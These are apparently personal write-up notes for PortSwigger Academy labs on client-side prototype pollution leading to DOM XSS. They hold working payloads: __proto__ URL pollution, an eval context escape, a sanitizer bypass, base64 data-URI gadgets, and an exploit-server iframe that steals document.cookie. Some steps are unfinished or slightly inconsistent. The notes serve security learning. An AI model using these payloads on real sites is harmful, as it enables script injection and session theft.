# [Client-side prototype pollution](https://portswigger.net/web-security/prototype-pollution)

materials:

[Widespread prototype pollution gadgets](https://portswigger.net/research/widespread-prototype-pollution-gadgets)

[JavaScript prototypes and inheritance](https://portswigger.net/web-security/prototype-pollution/javascript-prototypes-and-inheritance)

[What is prototype pollution?](https://portswigger.net/web-security/prototype-pollution/what-is-prototype-pollution)

[Finding prototype pollution vulnerabilities](https://portswigger.net/web-security/prototype-pollution/finding)

[Testing for client-side prototype pollution](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#detecting-sources-for-prototype-pollution)


# [1. Lab: DOM XSS via client-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/finding/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution)

 This lab is vulnerable to DOM XSS via client-side prototype pollution. To solve the lab:

    Find a source that you can use to add arbitrary properties to the global Object.prototype.

    Identify a gadget property that allows you to execute arbitrary JavaScript.

    Combine these to call alert().

You can solve this lab manually in your browser, or use DOM Invader to help you. 


1. using DOM invader: 
idetify with invader sinks + search for gadgets + exploit:
```
GET /?__proto__[transport_url]=data:,alert(1) HTTP/1.1
```
2. manually:
send a request to 
```
GET ?__proto__[foo]=bar HTTP/1.1
```
in the console test for pollution:
```
>Object.prototype.foo
<'bar'
```
we have pollution. lets fimd a way to utilize it:
\TBC
\
\

# [2. Lab: DOM XSS via an alternative prototype pollution vector](https://portswigger.net/web-security/prototype-pollution/finding/lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector)

 This lab is vulnerable to DOM XSS via client-side prototype pollution. To solve the lab:

    Find a source that you can use to add arbitrary properties to the global Object.prototype.

    Identify a gadget property that allows you to execute arbitrary JavaScript.

    Combine these to call alert().

You can solve this lab manually in your browser, or use DOM Invader to help you. 

1. try to pollute **prototype[foo]=bar** - check console for Object.prototype.foo - see pollution failed

2. try to pollute **__proto__.foo=bar** - see it poluuted in console:
```
> Object.prototype.foo
< bar
```
3. check source tab in devtools - search script for sinks - find eval at 
```
GET /resources/js/searchLoggerAlternative.js HTTP/1.1

eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');
```
4. pollute **__proto__.sequence** with an eval-sink payload:
```
__proto__.sequence=alert(1)
```
see it doesnt pop
5. in devtool/debugger press the line number of the eval call to mark a breakpoint and refresh. hover over sequence to see its value: **"alert()1"

6. escape out of context: use "-" operand to create the following string, poping an alert:
```
__proto__.sequence=alert(1)-
```

once the eval parses the alert()-1 it executes the alert pop
(no sure why - maybe because it tries to calculate the mathemtics and has to evaluate the alert first? TBC)

# [3. Lab: Client-side prototype pollution in third-party libraries](https://portswigger.net/web-security/prototype-pollution/finding/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries)

 This lab is vulnerable to DOM XSS via client-side prototype pollution. This is due to a gadget in a third-party library, which is easy to miss due to the minified source code. Although it's technically possible to solve this lab manually, we recommend using DOM Invader as this will save you a considerable amount of time and effort.

To solve the lab:

    Use DOM Invader to identify a prototype pollution and a gadget for DOM XSS.

    Use the provided exploit server to deliver a payload to the victim that calls alert(document.cookie) in their browser.

This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details, check out Widespread prototype pollution gadgets by Gareth Heyes. 

1. via DOM invader find exploit (I have changed the values t0 1-8 to note which one executes in the end):
```
https://0a77001503c2c28ac1a7eb5b004b0064.web-security-academy.net/?constructor[prototype][hitCallback]=alert%281%29&constructor.prototype.hitCallback=alert%282%29&__proto__.hitCallback=alert%283%29&__proto__[hitCallback]=alert%284%29#constructor[prototype][hitCallback]=alert%285%29&constructor.prototype.hitCallback=alert%286%29&__proto__.hitCallback=alert%287%29&__proto__[hitCallback]=alert%288%29
```
2. in exploit server prepare an iframe:
```
<iframe src="https://0a77001503c2c28ac1a7eb5b004b0064.web-security-academy.net/?constructor[prototype][hitCallback]=alert%281%29&constructor.prototype.hitCallback=alert%282%29&__proto__.hitCallback=alert%283%29&__proto__[hitCallback]=alert%284%29#constructor[prototype][hitCallback]=alert%285%29&constructor.prototype.hitCallback=alert%286%29&__proto__.hitCallback=alert%287%29&__proto__[hitCallback]=alert%28document.cookie%29">
```

# POP

[How to prevent prototype pollution vulnerabilities](https://portswigger.net/web-security/prototype-pollution/preventing)


# [3. Lab: Client-side prototype pollution via flawed sanitization](https://portswigger.net/web-security/prototype-pollution/preventing/lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization)

 This lab is vulnerable to DOM XSS via client-side prototype pollution. Although the developers have implemented measures to prevent prototype pollution, these can be easily bypassed.

To solve the lab:

    Find a source that you can use to add arbitrary properties to the global Object.prototype.

    Identify a gadget property that allows you to execute arbitrary JavaScript.

    Combine these to call alert()


1. with DOM invader find:
```
https://0a590058032b61ccc35d492b004a003b.web-security-academy.net/?constructor[prototype][transport_url]=data%3A%2Calert%281%29&constructor.prototype.transport_url=data%3A%2Calert%281%29&__proto__.transport_url=data%3A%2Calert%281%29&__proto__[transport_url]=data%3A%2Calert%281%29#constructor[prototype][transport_url]=data%3A%2Calert%281%29&constructor.prototype.transport_url=data%3A%2Calert%281%29&__proto__.transport_url=data%3A%2Calert%281%29&__proto__[transport_url]=data%3A%2Calert%281%29
```

2. in source look at the code. note in **searchLoggerFiltered.js**:
```js
function sanitizeKey(key) {
    let badProperties = ['constructor','__proto__','prototype'];
    for(let badProperty of badProperties) {
        key = key.replaceAll(badProperty, '');
    }
    return key;
```

<!-- 3. bypass sanitize with *%6f* instead of *o* failed
c%6fnstructor.prot%6ftype.transp%6frt_url=data%3A%2Calert%281%29 -->

3. bypass filter with:
```
/?__pr__proto__oto__[foo]=bar
```
in console:
```
> Object.prototype.foo
< 'bar'
```
4. try with alert and see n pop up:
```
/?__pr__proto__oto__[transport_url]=alert()
```

5. in devtools/elements look for payload reflection:
```
<script src="alert()"></script>
```

6. change **alert()** into *data protocol* based payload (which allows base64 encoding): **data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==** (from [payloadallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#bypass-word-blacklist-with-code-evaluation)


final payload:
```
https://0a590058032b61ccc35d492b004a003b.web-security-academy.net/?__pr__proto__oto__[transport_url]=data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==
```
#


[Prototype pollution via browser APIs](https://portswigger.net/web-security/prototype-pollution/browser-apis)


**source:**
```
?__proto__[headers][x-username]=<img/src/onerror=alert(1)>
```
**sink:**
```
message.innerHTML = `My products. Logged in as <b>${username}</b>`;
```


# [1. Lab: Client-side prototype pollution via browser APIs](https://portswigger.net/web-security/prototype-pollution/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis)

 This lab is vulnerable to DOM XSS via client-side prototype pollution. The website's developers have noticed a potential gadget and attempted to patch it. However, you can bypass the measures they've taken.

To solve the lab:

    Find a source that you can use to add arbitrary properties to the global Object.prototype.

    Identify a gadget property that allows you to execute arbitrary JavaScript.

    Combine these to call alert().

You can solve this lab manually in your browser, or use DOM Invader to help you.

This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details, check out Widespread prototype pollution gadgets by Gareth Heyes. 

1. with DOM invader identify vaulnarble "value" parameter
2. try diffrent polutions and find:
```
?__proto__[value]=foo
```
check in console:
```
> Object.prototype.value
< 'bar'
```
3. change to **?__proto__[value]=alert()** - no pop find in devtools/elements:
```
<script src="alert()"></script>
```
4. use **data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==** as payload:
```
?__proto__[value]=data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==
```


